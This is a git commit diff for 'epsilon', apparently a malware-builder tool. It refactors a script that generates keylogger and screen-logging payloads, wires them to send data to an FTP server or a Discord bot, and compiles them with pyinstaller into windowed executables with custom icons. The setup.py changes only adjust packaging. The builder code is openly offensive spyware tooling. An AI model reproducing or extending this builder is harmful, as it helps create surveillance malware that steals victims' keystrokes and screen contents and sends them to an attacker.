42496023087d425b7250486dfcd72fa508fd9e98
__SyS__ <sreyassreelal@gmail.com>
2017-09-24 13:53:45 +0530

    added built files

--- epsilon.py
+++ epsilon.py
@@ -15,74 +15,77 @@ ASCII_DATA = '''
 \n\n
 
 '''
-print_title()
-print_white(ASCII_DATA)
-DEBUG = True
-
-
-
-DEBUG = bool(input(print_green("Debug mode(True/False) : ")))
-Name = input(print_yellow("Provide name of the binary : "))
-
-print_green("Input network pathway for communication:")
-print_white("1.Ftp")
-print_white("2.Discord bot")
-
+def start_epsilon():
     
+    print_title()
+    print_white(ASCII_DATA)
+    DEBUG = True
 
-network = input(print_white("Select your option : "))
-File = open(Name+'.py','w')
-File.write('import payloads.behaviour\n')
 
-if network == "1":
-    address = input(print_white("input ftp address : "))
-    username = input(print_white("input ftp username : "))
-    password = input(print_white("input ftp password : "))
-    File.write('from  network.ftpconn import init_creditinals\n')
-    File.write('init_creditinals("' +  address + '","' + username + '","' + password + '")\n' )
-    
-    print_green("Select yor payloads (seprated by spaces) :")
-    print_white("1.Satelite")
-    print_white("2.KeyLogger")
-    keys = input(print_white("Select your option(s) : "))
-    
-    list_keys = [int(k) for k in keys.split(' ')]
-    
-    for i in list_keys:
+
+    DEBUG = bool(input(print_green("Debug mode(True/False) : ")))
+    Name = input(print_yellow("Provide name of the binary : "))
+
+    print_green("Input network pathway for communication:")
+    print_white("1.Ftp")
+    print_white("2.Discord bot")
+
         
-        if i == 1:
-            File.write('from network.ftpconn import startimageloggging\n')
-            File.write('startimageloggging()\n')
-        elif i ==2:
-            File.write('from network.ftpconn import startkeylogging\n')
-            File.write('startkeylogging()\n')
 
-elif network == "2":
-    token = input("Input your discord bot token")
-    File.write('from network.discordbot import runbot,init_bot\n')
-    File.write('init_bot("'+token+'")\n')
-    File.write('runbot()\n')
-    
-iconfile = input(print_magenta("icon file for the binary (if not needed leave it) : "))
+    network = input(print_white("Select your option : "))
+    File = open(Name+'.py','w')
+    File.write('import payloads.behaviour\n')
 
-File.close()
-print_success("Create payload " + Name + ".py")
-Create_Binary = input(print_yellow("Do you want to compile and create binary of created payload? (Y/N)"))
+    if network == "1":
+        address = input(print_white("input ftp address : "))
+        username = input(print_white("input ftp username : "))
+        password = input(print_white("input ftp password : "))
+        File.write('from  network.ftpconn import init_creditinals\n')
+        File.write('init_creditinals("' +  address + '","' + username + '","' + password + '")\n' )
+        
+        print_green("Select yor payloads (seprated by spaces) :")
+        print_white("1.Satelite")
+        print_white("2.KeyLogger")
+        keys = input(print_white("Select your option(s) : "))
+        
+        list_keys = [int(k) for k in keys.split(' ')]
+        
+        for i in list_keys:
+            
+            if i == 1:
+                File.write('from network.ftpconn import startimageloggging\n')
+                File.write('startimageloggging()\n')
+            elif i ==2:
+                File.write('from network.ftpconn import startkeylogging\n')
+                File.write('startkeylogging()\n')
 
-if Create_Binary == 'Y' or Create_Binary == 'y':
-    cmd = "pyinstaller "+ Name+".py" + ' -y --distpath="." --workpath="." --clean -F'
-    if not DEBUG :
-        cmd = cmd + " --windowed"
-    if iconfile is not "":
-        if '.ico' not in iconfile:
-            iconfile = iconfile + '.ico'
-        cmd = cmd + " --icon="+iconfile
-     
-    os.system(cmd) 
-    try:
-        shutil.rmtree(Name)
-        os.remove(Name+'.spec')
-    except:
-        pass
+    elif network == "2":
+        token = input("Input your discord bot token")
+        File.write('from network.discordbot import runbot,init_bot\n')
+        File.write('init_bot("'+token+'")\n')
+        File.write('runbot()\n')
+        
+    iconfile = input(print_magenta("icon file for the binary (if not needed leave it) : "))
 
-    
+    File.close()
+    success("Creating payload " + Name + ".py")
+    Create_Binary = input(print_yellow("Do you want to compile and create binary of created payload? (Y/N)"))
+
+    if Create_Binary == 'Y' or Create_Binary == 'y':
+        cmd = "pyinstaller "+ Name+".py" + ' -y --distpath="." --workpath="." --clean -F'
+        if not DEBUG :
+            cmd = cmd + " --windowed"
+        if iconfile is not "":
+            if '.ico' not in iconfile:
+                iconfile = iconfile + '.ico'
+            cmd = cmd + " --icon="+iconfile
+        
+        os.system(cmd) 
+        try:
+            shutil.rmtree(Name)
+            os.remove(Name+'.spec')
+        except:
+            pass
+
+if __name__ == '__main__':
+	start_epsilon();
--- setup.py
+++ setup.py
@@ -3,20 +3,18 @@ from setuptools import setup, find_packages
 setup(
     name='epsilon',
     version='1.0',
-    packages=find_packages(),
+    packages=find_packages(exclude=["*.tests", "*.tests.*", "tests.*", "tests"]),
     include_package_data=True,
     install_requires=[
-        'Click',
         'Colorama',
         'BeautifulSoup4',
         'Psutil',
         'Discord',
         'Asyncio',
         'Mss',
-        
     ],
     entry_points='''
         [console_scripts]
-        epsilon=epsilon:cli
+        epsilon=epsilon:start_epsilon
     ''',
 )
